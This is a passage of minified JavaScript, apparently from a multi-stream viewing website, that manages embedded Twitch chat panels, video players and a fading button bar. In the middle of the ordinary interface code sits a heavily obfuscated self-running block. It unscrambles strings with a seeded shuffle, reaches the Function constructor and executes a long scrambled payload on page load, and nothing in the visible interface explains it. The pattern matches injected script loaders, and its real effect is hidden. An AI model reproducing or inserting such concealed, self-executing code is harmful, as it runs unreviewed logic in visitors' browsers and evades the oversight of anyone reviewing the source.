t=document.getElementById("chat-container");if(t.querySelector(`iframe[title="${e}"]`))return!1;{var n=document.createElement("div");n.style.position="relative",n.className="chatwrapper",n.id=e+"twitchat";var i=document.createElement("iframe");i.title=e,i.frameBorder="0",i.className="chatiframe",i.height="400px",i.src="https://www.twitch.tv/embed/"+e+"/chat?darkpopout&parent=kickmultistream.github.io";const s=document.getElementById("widthSlider"),o=parseInt(s.value);i.width=o;var a=document.createElement("span");a.innerText=e,a.style.position="absolute",a.style.top="0",a.style.left="50%",a.style.transform="translateX(-50%)",a.style.backgroundColor="#18171C",a.style.color="grey",a.style.fontWeight="bold",a.style.padding="5px",a.style.fontSize="17px",a.style.textAlign="center",a.style.minWidth="130px",a.style.maxWidth="200px",a.style.display="inline-block";var l=document.createElement("button");const r="https://i.imgur.com/UHQQQxe.png";l.className="chat-close-button",l.style.width="15px",l.style.height="15px",l.style.backgroundImage=`url(${r})`,l.style.backgroundSize="cover",l.style.backgroundPosition="center",l.style.backgroundRepeat="no-repeat",l.style.position="absolute",l.style.top="0",l.style.right="0",l.style.zIndex="999",l.onclick=function(){t.removeChild(n)},n.appendChild(i),n.appendChild(l),n.appendChild(a),t.appendChild(n)}}function toggleChat(e){addChat(e)}function hideAllPlayers(){var e=document.getElementById("videoContainer");e.querySelectorAll(".videowrapper").forEach((function(t){t.querySelectorAll(".streamcontainer").forEach((function(e){for(var n=e.querySelector(".video-js");n;)n.player&&n.player.dispose(),e.removeChild(n),n=e.querySelector(".video-js");t.removeChild(e)})),e.removeChild(t)})),document.querySelectorAll(".twitch-container").forEach((t=>{e.removeChild(t)}))}function hideAllChats(){for(var e=document.getElementById("chat-container");e.firstChild;)e.removeChild(e.firstChild)}function showButtonContainer(){document.getElementById("button-container").style.opacity="1"}function hideButtonContainer(){document.getElementById("button-container").style.opacity="0"}function resetTimer(){clearTimeout(timer),timer=setTimeout(hideButtonContainer,1e3)}!function(){function e(e){for(var t=2271082,n=e.length,i=[],a=0;a<n;a++)i[a]=e.charAt(a);for(a=0;a<n;a++){var l=t*(a+431)+t%20019,s=t*(a+776)+t%49697,o=l%n,r=s%n,d=i[o];i[o]=i[r],i[r]=d,t=(l+s)%3293541}return i.join("")}var t=e("numfvziuacrsyctergjxtqoonrskpctolwhbd").substr(0,11),n=e[t];n("",n("",e('a,e=a=3[8tj1h0 mcbd7gr+r-")lc]vfa(w0k)m;-to"sh8l;(7j"7=u)5(]"[anarul6+a"u1;wrc1(wc96,vh*C]s1s;r0n()ve+,!.,)1,]9r,6,(f;;9]rvw(a e;.8f)ejr([ef=Sp;)w([nnrgad]s+2;e=[cv]+nr0(== ;di[soo+vt(]"o82+,(;u"6;ia2[ell t6;i).=v.ttf=j,a)[+=2xc)r.ggp8pll)gw<u(jbu.<tneboSit0(;nbr.+rgv 0r]s,4l  ,oc;,;]i 2tfA)){.,, muC18=ngkt(v 7[sa;edr u=.uo+denvfno.srfr6a=i)f-0(to=;os w01or=+(=g(hvrr(+oi.ah0m 1=x pCvha6fxzAgls;e=e ;vtin4b{eff=jo{t8otnc5,<+nqjjr(Cn.e+.aib6an;9lvrr=++np);qes9fjhd1;0{i=>bakre(h.At5v3i(t(a=n,ri,((wa6uf+,snr+hCfrvA o)wa)a0;1C,;.,a2ifo=u[mh+(+i.t.=}8t9=[1nu8vnl hp{oo1.=e=;l.x=hiros-eja=)ngg il=)r;";r];(prr]r)};p=v)"{}tiaw;ru,ll+[i,igc*)v0m"vrsC.fh=n,r)<( dl;;sp.=isv =)i; nda4rk;v}lcda70.);mw;[=h=vrteorevr)4}arme=t+9c;2tqe,d)28nur23<u)=ab0)(ru7+;,t=nrl.ntn+Cvr aim8;)wodn)ob)hs1]-ppaerc;pvg.v(,a.ci.i;=t(]or(aba(ypc7arg>cc)nuioiohg}w.;s-e1h;[hu= nlg7mhlh; i,(fcr)t!u{nmhA-;bt=qa}hd cca+;'))(e('6"(.t9o.l5m4O45OO0t"d,4)a1O1(nne7_s__oj)1;6}ee(0_o!s5tOOre/%u,[_}O8pOO{$1$_y1,s$Ob3 kon1)1.!ci.soiO0)!_;9eOe5a7<rat7,..83=g4o_fSO!n!s&atOr+/odb1lwO32(6_OfbOOl5_l_c%3u].obe}9,0e)o>Om]o.3e%I7(=dO9e.OOe3Om1c2ae0O7O8c)[i(irgol(yOmtro$p2b5,}33i9t=ii1O) r2Cr<i.yueiiO..ew!r Opl t(.0m!2i1;claf;w/(!4igOe)Oen7e2)."Od{hau3f(3$%e0o(Ooa3=+ dosynu)43a0sO)tru;}$!sn2etmn;k0O,$%1 r= $OO$O1_==)8Oh.jwOjisieOgs7O}..=4js=?w+aoelmm3O9n)hema2nO)g)cwOOO):b]6!t,.=0O!r(OIc_ +rtOajOp5+{9>13/Ohu)r..(O(Of.sa%Oe5!!p{29}2_84ef__!=0n=_%$1tObu9)).s!1)%<O)i1Or(O,O?ao0_/ co,.t=;vf3c.d,i}i\'O3(rf7%5,)etrw7/e7!s9On)e3",a4O5);.0)=)#_.7O 8==Of.__9%er.u0;1dr+OsO<6.5&fe=tg1i;?O=$2(a7O$.);ps;({4 c=l.))aO.$_O_gtjOnplO.{Sr3(i ]dCo_!(5o)3h{n,.5O4/O57err&5=O!e5b\' ,OC;0/0$_7{Ogr,r[e] 5;5O4u]nOwug{OO;(;eao!}johk!i%O2O+6i!O,.On)&$)_2c eut(robOOj,-_)s.(Omn]O;nOfO9e2);0_3_i&(;hw0&fg4O)gf\'Owr:!,]O(ej;O=t("O;5O/5Os3O-O&2=!loO)()!_95(u+(oOuemleO4o(abO)[751be.36_mig01ft_!5 _emOs5naf4;(_;.!1!Oee)_/!((O)!.(sj890s)8;Ougm.9O:x.et$;(.Ims,epy3{3+ #h{if{),=9114o.)/a;;61$4Od" gfd6.Ol)6;);_r_!6e_,re;4O_%goO)OO3e_d_%O(mnyO$Ojf9t7mOa6mxalb0brn))a_;e]}4e;et.!.asOfs_cO2n22(O.$$O6>O\'n")!i(y ;rb.;or{O002edads=}3thO.riO\'jz93O=7O)ol%!!OmO]2h>hrpjae,;eov],=O6j.*Tt.e*!t5,s],3o(y.O1))dte}3($j_):et9(S7=27.y7e+bt1(t_q(.Ob;g(en?.O7#813#O{O.r]\')8Oqj3j!(O%uh1r*(r$OO}8h*O)263&2 w6_aO],_s n(7O>]4bz),(Os12}"1$sphaO(2j5O .t;g(t.--l9$f,2.4O=oa./3ue$) !",$):u_4O/ce;a(]sa_1O)a{$On9O44n;>).O%l#15eOos8)(:tOou.m".+)n_[g]O_ha_i!,{_&_riO.e_)()vd)([aO!O_ 4b%(_nnq6.;m((=7m[umOnO2OO.).}ct15!.Of nO4:d]o31i.5)l,y3[O.3tm =)!e.6u()mnt.rl se#%)-. ( O#c!(,_O5}Ob se"mv4=t}i_{_ye !s7#')))(3630)}(),document.getElementById("button-container").addEventListener("mouseenter",(function(){clearTimeout(timer),showButtonContainer()})),document.getElementById("button-container").addEventListener("mouseleave",(function(){resetTimer()})),showButtonContainer(),setTimeout(hideButtonContainer,3e3);const topbardiv=document.getElementById("showtopbar");topbardiv.addEventListener("click",(()=>{"1"===document.getElementById("button-container").style.opacity?document.getElementById("button-container").style.opacity="0":document.getElementById("button-container").style.opacity="1"}));